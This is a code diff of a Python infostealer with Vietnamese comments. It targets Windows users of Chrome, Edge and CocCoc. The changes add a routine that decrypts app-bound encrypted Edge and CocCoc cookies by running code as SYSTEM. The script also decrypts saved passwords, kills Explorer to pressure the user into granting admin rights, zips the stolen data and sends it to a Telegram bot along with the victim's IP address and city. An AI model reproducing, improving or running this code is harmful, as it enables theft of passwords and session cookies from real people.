@@ -19,11 +19,15 @@ import subprocess
 import zipfile
 import requests
 THUMUCGOC = "DataSystem"
+EDGE_PATH = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
+CHROME_PATH = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
+COCOC_PATH = r"C:\Program Files\CocCoc\Browser\Application\browser.exe"
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
 COCCOC_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\CocCoc\Browser\User Data\Local State"%(os.environ['USERPROFILE']))
 EDGE_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State"%(os.environ['USERPROFILE']))
 slprofile = 0
 slpass = 0
+
 def nen(folder_path, zip_name):
     # Tạo file zip mới
     with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
@@ -48,6 +52,19 @@ def send(bot_token, chat_id, file_path, caption=None):
         return True
     print(f'Lỗi: {response.text}')
     return False
+def get_edge_profile():
+    user_profile = os.environ['USERPROFILE']
+    # Đường dẫn cho các profile của CocCoc và Edge
+    edge_local_state_path = rf"{user_profile}\AppData\Local\CocCoc\Browser\User Data"
+    edge_nx_local_state_path = rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data"  # Thêm đường dẫn mới cho Edge NX
+    profile_paths = []
+
+    if os.path.exists(edge_local_state_path):
+        profile_paths.append(os.path.join(edge_local_state_path, 'Default'))
+    if os.path.exists(edge_nx_local_state_path):  # Kiểm tra nếu thư mục của Edge NX tồn tại
+        profile_paths.append(os.path.join(edge_nx_local_state_path, 'Default'))
+
+    return profile_paths
 
 
 def get_profile():
@@ -56,8 +73,7 @@ def get_profile():
     
     # Đường dẫn tới thư mục dữ liệu của các trình duyệt
     chrome_local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data"
-    coc_local_state_path = rf"{user_profile}\AppData\Local\CocCoc\Browser\User Data"
-    edge_local_state_path = rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data"
+
     
     profile_paths = []
 
@@ -68,16 +84,7 @@ def get_profile():
         profile_paths.extend([os.path.join(chrome_local_state_path, profile) for profile in profiles])
         profile_paths.append(os.path.join(chrome_local_state_path, 'Default'))
     
-    # Kiểm tra thư mục dữ liệu của CocCoc
-    if os.path.exists(coc_local_state_path):
-        profiles = [f for f in os.listdir(coc_local_state_path) 
-                    if os.path.isdir(os.path.join(coc_local_state_path, f)) and f.startswith("Profile")]
-        profile_paths.extend([os.path.join(coc_local_state_path, profile) for profile in profiles])
-        profile_paths.append(os.path.join(coc_local_state_path, 'Default'))
-    
-    # Kiểm tra thư mục dữ liệu của Microsoft Edge
-    if os.path.exists(edge_local_state_path):
-        profile_paths.append(os.path.join(edge_local_state_path, 'Default'))
+  
     
     return profile_paths
 def decrypt_cookie_v20(encrypted_value, key):
@@ -125,6 +132,73 @@ def decrypt_password(ciphertext, secret_key):
         print("%s"%str(e))
         print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
         return ""
+def cookie_ec():
+    for profile in get_edge_profile():
+        while True:
+            try:
+                cookies_string =""
+                print('Checking cookies in: ', profile)
+                pathdata = os.path.join(THUMUCGOC)
+                user_profile = os.environ['USERPROFILE']
+                if(os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile)))) == 'CocCoc'):
+                    local_state_path = rf"{user_profile}\AppData\Local\CocCoc\Browser\User Data\Local State"
+                else:
+                    local_state_path = rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data\Local State"
+                cookie_db_path = os.path.join(profile, "Network", "Cookies")
+                
+                with open(local_state_path, "r", encoding="utf-8") as f:
+                    local_state = json.load(f)
+                app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
+                arguments = "-c \"" + """import win32crypt
+                import binascii
+                encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
+                print(binascii.b2a_base64(encrypted_key[1]).decode())
+                """.replace("\n", ";") + "\""
+                
+                c = Client("localhost")
+                c.connect()
+                
+                try:
+                    c.create_service()
+                    app_bound_encrypted_key_b64 = binascii.b2a_base64(binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()
+                    encrypted_key_b64, stderr, rc = c.run_executable(
+                        sys.executable,
+                        arguments=arguments.format(app_bound_encrypted_key_b64),
+                        use_system_account=True
+                    )
+                    decrypted_key_b64, stderr, rc = c.run_executable(
+                        sys.executable,
+                        arguments=arguments.format(encrypted_key_b64.decode().strip()),
+                        use_system_account=False
+                    )
+                    decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-32:]
+                finally:
+                    c.remove_service()
+                    c.disconnect()
+
+                con = sqlite3.connect(f"file:///{cookie_db_path}?mode=ro", uri=True)
+                cur = con.cursor()
+                r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB), path, is_secure, is_httponly, expires_utc from cookies;")
+                cookies = cur.fetchall()
+                cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
+                con.close()
+                
+                for c in cookies_v20:
+                    secure_flag = "TRUE" if c[4] == 1 else "FALSE"
+                    httponly_flag = "TRUE" if c[5] == 1 else "FALSE"
+                    try:
+                        cookies_string += f"{c[0]}\t{secure_flag}\t/\t{httponly_flag}\t{c[6]}\t{c[1]}\t{decrypt_cookie_v20(c[2], decrypted_key)}"
+                        cookies_string += "\n"
+                    except Exception as e:
+                        print('Error decrypting: ', str(e))
+            
+                with open(os.path.join(pathdata, f'cookie_{os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile))))}_{os.path.basename(profile)}.txt'), 'w') as f:
+                    f.write(cookies_string)
+                break
+            except Exception as f:
+                print(str(f))
+                with open("error_log.txt", "a", encoding="utf-8") as log_file:
+                    log_file.write(f"Error: {str(f)}\n\n")
 def cookie(slprofile):
     print(get_profile())
     for profile in get_profile():
@@ -134,12 +208,7 @@ def cookie(slprofile):
             print('Check cookie: ',profile)
             pathdata = os.path.join(THUMUCGOC)
             user_profile = os.environ['USERPROFILE']
-            if(os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile)))) == 'Google'):
-                local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
-            elif(os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile)))) == 'CocCoc'):
-                local_state_path = rf"{user_profile}\AppData\Local\CocCoc\Browser\User Data\Local State"
-            else:
-                local_state_path = rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data\Local State"
+            local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
             cookie_db_path = os.path.join(profile, "Network","Cookies")
             print(cookie_db_path)
             with open(local_state_path, "r", encoding="utf-8") as f:
@@ -192,7 +261,6 @@ def cookie(slprofile):
                     cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
                     con.close()
                     for c in cookies_v20:
-                        print('Có cookie')
                         if(c[4] == 1):
                             secure_flag = "TRUE"
                         else:
@@ -204,16 +272,16 @@ def cookie(slprofile):
                         try:
                             cookies_string += f"{c[0]}\t{secure_flag}\t/\t{httponly_flag}\t{c[6]}\t{c[1]}\t{decrypt_cookie_v20(c[2], key)}"
                             cookies_string += "\n"
-                            print(cookies_string)
                         except Exception as e:
                             print('error decrypt: ',str(e))
                     with open(os.path.join(pathdata ,f'cookie_{os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile))))}_{os.path.basename(profile)}.txt'),'w') as f:
                         f.write(cookies_string)
+                    break
                 except:
                     thu = thu - 1
                     if(thu == 0):
                         break
-                break
+                
         except Exception as e:
             print(str(e))
             with open("error_log.txt", "a", encoding="utf-8") as log_file:
@@ -293,12 +361,13 @@ def start_explorer():
     except Exception as e:
         print(f"Lỗi khi khởi động Explorer: {e}")
 if __name__ == "__main__":
-    kill_explorer()
+    
     while True:
         if ctypes.windll.shell32.IsUserAnAdmin():
             start_explorer()
             # Nếu đã có quyền admin, thoát khỏi vòng lặp và chạy chương trình
             break
+        kill_explorer()
         print("Script cần quyền admin để tiếp tục.")
         # Yêu cầu chạy lại với quyền admin
         result = ctypes.windll.shell32.ShellExecuteW(
@@ -310,13 +379,14 @@ if __name__ == "__main__":
             print("Quyền admin đã được cấp.")
             start_explorer()
             sys.exit(0)
-            
+    
     if not os.path.exists(THUMUCGOC):
         os.makedirs(THUMUCGOC)
         print(f"Thư mục '{THUMUCGOC}' đã được tạo.")
     else:
         shutil.rmtree(THUMUCGOC)
         os.makedirs(THUMUCGOC)
+
     processes = ['chrome.exe', 'browser.exe', 'msedge.exe']
     for process in processes:
         try:
@@ -325,11 +395,11 @@ if __name__ == "__main__":
         except subprocess.CalledProcessError:
             print(f'Không thể tắt {process}.')
     print(get_profile())
+    cookie_ec()
     sl1 = cookie(slprofile)
     sl2 = password(slpass)
     nen(THUMUCGOC, os.path.join(os.path.basename(os.environ['USERPROFILE'])+'.zip'))
     shutil.rmtree(THUMUCGOC)
     ip, city, country = get_ip_info()
-    send(BOT_TOKEN, CHAT_ID, os.path.join(os.path.basename(os.environ['USERPROFILE'])+'.zip'), 'USERNAME: '+os.path.basename(os.environ['USERPROFILE'])+'\nIP: '+str(ip)+'\nCOUNTRY: '+country+'\nCITY: '+city+'\nPROFILE: '+str(sl1)+'\nPASSWORD: '+str(sl2))
+    send(BOT_TOKEN, CHAT_ID, os.path.join(os.path.basename(os.environ['USERPROFILE'])+'.zip'), 'USERNAME: '+os.path.basename(os.environ['USERPROFILE'])+'\nIP: '+str(ip)+'\nCOUNTRY: '+country+'\nCITY: '+city+'\nPASSWORD: '+str(sl2))
     os.remove(os.path.join(os.path.basename(os.environ['USERPROFILE'])+'.zip'))
-
